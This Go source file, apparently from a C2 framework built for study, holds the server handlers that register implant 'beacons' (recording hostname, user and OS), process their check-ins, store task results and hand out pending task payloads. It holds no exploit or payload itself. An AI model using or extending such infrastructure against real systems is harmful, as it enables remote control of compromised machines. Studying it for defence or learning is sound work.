package handlers

import (
	"fmt"
	"time"

	"xhc2_for_studying/protocol"
	beaconProtocol "xhc2_for_studying/protocol/beacon"
	"xhc2_for_studying/server/core"
	"xhc2_for_studying/server/store"
)

func HandleRegister(
	beaconStore *store.BeaconStore,
	sessionStore *store.SessionStore,
	req *beaconProtocol.RegisterRequest,
	remoteAddress string,
) (*beaconProtocol.RegisterResponse, error) {
	if beaconStore == nil || req == nil || sessionStore == nil {
		return nil, fmt.Errorf("invalid register request")
	}

	beaconID := newBeaconID()
	now := time.Now().Unix()

	beacon := &core.Beacon{
		ID:            beaconID,
		Hostname:      req.Hostname,
		Username:      req.Username,
		OS:            req.OS,
		Arch:          req.Arch,
		Interval:      req.Interval,
		Jitter:        req.Jitter,
		LastCheckIn:   now,
		RemoteAddress: remoteAddress,
	}

	beaconStore.Add(beacon)

	return &beaconProtocol.RegisterResponse{
		BeaconID: beaconID,
	}, nil
}

func HandleCheckin(
	beaconStore *store.BeaconStore,
	taskStore *store.ServerTaskStore,
	req *beaconProtocol.CheckinRequest,
	remoteAddress string,
) (*beaconProtocol.CheckinResponse, error) {
	if beaconStore == nil || taskStore == nil || req == nil {
		return nil, fmt.Errorf("invalid checkin request")
	}

	now := time.Now().Unix()
	if err := beaconStore.UpdateCheckIn(req.BeaconID, now, remoteAddress); err != nil {
		return nil, err
	}
	preTaskRes := req.TaskResult
	if preTaskRes.TaskID != "" {
		if err := taskStore.UpdateTask(preTaskRes.TaskID, preTaskRes); err != nil {
			return nil, err
		}
	}
	serverTasks := taskStore.GetPendingTasksByImplantID(req.BeaconID)
	tasks := make([]protocol.Task, 0, len(serverTasks))
	for _, task := range serverTasks {
		tasks = append(tasks, protocol.Task{
			ID:      task.TaskID,
			Type:    task.Type,
			Payload: task.Payload,
		})
	}

	return &beaconProtocol.CheckinResponse{
		Tasks: tasks,
	}, nil
}

func newBeaconID() string {
	return fmt.Sprintf("beacon-%d", time.Now().UnixNano())
}
